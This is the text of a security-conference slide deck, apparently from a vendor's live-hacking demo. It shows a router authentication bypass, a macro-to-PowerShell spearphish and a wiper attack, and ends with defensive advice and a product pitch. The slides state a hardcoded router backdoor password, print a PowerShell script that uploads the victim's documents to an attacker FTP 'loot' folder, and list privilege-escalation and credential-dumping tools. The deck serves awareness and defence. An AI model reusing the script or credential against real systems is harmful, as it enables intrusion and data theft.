SESSION ID: EXP-R05R
Hacking Exposed LIVE: Attacking in the Shadows
#RSAC

Stuart McClure
CEO/President Cylance Inc.

#RSAC
Threat Landscape
Informational
Execution Authentication
Denial of Service
2

#RSAC
"The Scenario"
Target: Critical Infrastructure Router / Firewall
Authentication Bypass
Spearphish, exfiltrate and Pony
Fileless attack inside XLS->macro->Powershell Pony botnet attack inside XLS->macro->Powershell
Phish and Kill
Send users new IE Exploit (user) Use SmashedPotato to escalate privilege (Admin) Wipe the target with BlackEnergy / Ukrainian Killdisk
3

Attack Map

192.168.2.0/24 192.168.2.4
Hacker

Hacker

Hack #1: Exfiltrate and Pwn

Company ABC

Hack #0: Bypass and Re-Configure Router

Server FTP/HTTP/C2

Internet Router
Hack #2: Exploit, Escalate and Eviscerate
4

#RSAC
10.10.1.0/24

#RSAC
Hack #0: Bypass and Re-configure Router
5

#RSAC
Hack #0: Bypass
Common Internet router Hardcoded backdoor password of "FGTAbc11*xy+Qqz27" Gives maintenance account access as SUPER ADMIN Perform any function as router administrator
Update SUPER ADMIN password
All from remote

#RSAC
Hack #0: Bypass
7

#RSAC
Hack #0: Re-Configure Router
8

#RSAC
Hack #0: Re-configure
Add "FTP ALLOW" outbound Turn on Web Filters Disable AV Block AV update websites
9

#RSAC
Hack #0: DEMO
Show the router Show the Python script to reset password Run Python script to reset password Show Console Show Python script to re-configure router Run Python script to re-configure router Show Console with changes made
10

#RSAC
Hack #0: DEMO
LIVE
11

#RSAC
Hack #1: Spearphish, exfiltrate and Pony

#RSAC
Hack #1: Spearphish, exfiltrate and Pony
IT Admin user running as USER Receives weaponized XLS in email which (behind the scenes)...
Runs embedded Macro which... Runs embedded Powershell script which...
FTPs all files from "My Documents" to FTP server Download Pony botnet and runs it
Show Pony C2

#RSAC
Hack #1: Exfiltrate script
Powershell Script: $commands = '$p = [environment]::getfolderpath("mydocuments"); $extensions = ".xls", ".xlsx", ".pdf", ".doc", ".docx", ".pptp", ".pptx", ".rtf"; Foreach($path in Get-ChildItem $p -recurse){if ($extensions contains $path.extension){$webclient = New-Object System.Net.WebClient;$uri = New-Object System.Uri("ftp://grabby:myfiles@192.168.2.4/loot/" + $path.name); $webclient.UploadFile($Uri, $path.fullname);}}' $encodedstring = [Convert]::ToBase64String($bytes) $encodedstring
14

#RSAC
Hack #1: DEMO
Show the email Show the FTP server directory empty Show Pony C2 Console without victim Show the victim without Pony Open the XLS attachment Show the FTP server directory not empty Show the network traffic Show Pony started in Task Manager Show Pony C2 Console with victim present
15

#RSAC
Hack #1: DEMO
LIVE
16

#RSAC
Hack #2: Exploit, Escalate and Eviscerate

Hack #2: "Forever Days" Primer
Local Pass the Hash Password dumping (pwdump, cachedump, fgdump, quarkspwdump, creddump, WCE, gsecdump, mimikatz) MSHTA and Windows MOF (WMI) AT Scheduler / Scheduled Tasks DLL Search Order Hijacking, DLL Highjacking, DLL pre-loading DLL Side Loaders (McAfee's mcvsmap.exe, Intel's hkcmd.exe, NVIDIA's NvSmart.exe, Microsoft's igxfstray.exe, Microsoft's OInfo P11.exe) API Hooking and DLL Injection (svchost.exe, msiexec.exe) BIOS/Firmware hacking Hot Potato ­ NTLM/NBNS spoofing to run commands Spangler attack - NTLM MITM
Remote PSEXEC (TCP 139/445) ­ writing to SVCCTL named pipe over SMB WMI (TCP 135) ­ RPCSS in SVCHOST.EXE Remote Registry (winreg) Remote Desktops - RDP (TCP 3389), WinRS (TCP 80/5985), VNC, SCCM, SCP/SSH, TFTP, etc. vPRO AMT hack

#RSAC

#RSAC
Hack #2: Exploit
New MS XML Exploit Double free memory vulnerability in MSXML3.dll Invokable with IE Validating DTDs (Document Type Definition) in an XML document Invalid forward ID references Memory occupied by a forward reference object is freed twice Present in older heap manager used

#RSAC
Hack #2: Escalate
Hot Potato and SmashedPotato Download and run Privilege escalation to SYSTEM HTTP -> SMB NTLM relay (MITM attack) Uses WPAD (Web Proxy AutoDiscovery) NTLM Credentials relayed to local SMB listener to create new service that runs user-defined command http://foxglovesecurity.com/2016/01/16/hot-potato/

#RSAC
Hack #2: Eviscerate
BlackEnergy / Ukranian KillDisk
Using SmashedPotato, run latest KillDisk malware Crimeware sold on Russian underground since 2007 Botnets and DDoS attacks, Plug-in architecture Links to 2008 Georgian attack In 2014 variants included plugin to destroy system called "dstr" Nov. 2015 first case in the wild at CERT-UA surrounding Ukranian local elections (videos and documents destroyed) Complete list of files destroyed has over 4000 file extensions

#RSAC
Hack #2: Eviscerate
Specific time delay allowed Deletes Windows Event Logs: Application, Security, Setup and System. Deletes documents and files on disk Terminates and overwrites ICS services:
komut.exe and sec_service.exe (ASEM Ubiquity)
Samples used: 5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6 ("ololo 2.exe", "crab.exe", "ololo.exe") F52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95 ("svchost.exe")
22

#RSAC
Hack #2: DEMO
Show the email Click on URL link Show Task Manager (SmashedPotato) Show Task Manager (KillDisk) Watch the insanity...
23

#RSAC
Hack #2: DEMO
LIVE
24

#RSAC
"Apply" what you've learned
25

"Apply" what you've learned
Authentication Bypass Inventory the make and manufacturers Stay on top of their known vulnerabilities Red team your network infrastructure often
Exfiltration Prevent Macros and Powershell and ActiveScripts Monitor your outbound traffic looking for file transfer traffic
Forever-Days Search them out in your organization Configure/Harden your systems to reduce their success
Stay on top of known vulnerabilities and patch and/or plug them Focus on PREVENTION with next generation protection like Cylance
26

#RSAC

#RSAC
Thank you!!! Come to the Cylance booth (#342) for a demo of how we prevent all these attacks and much more!!!
27

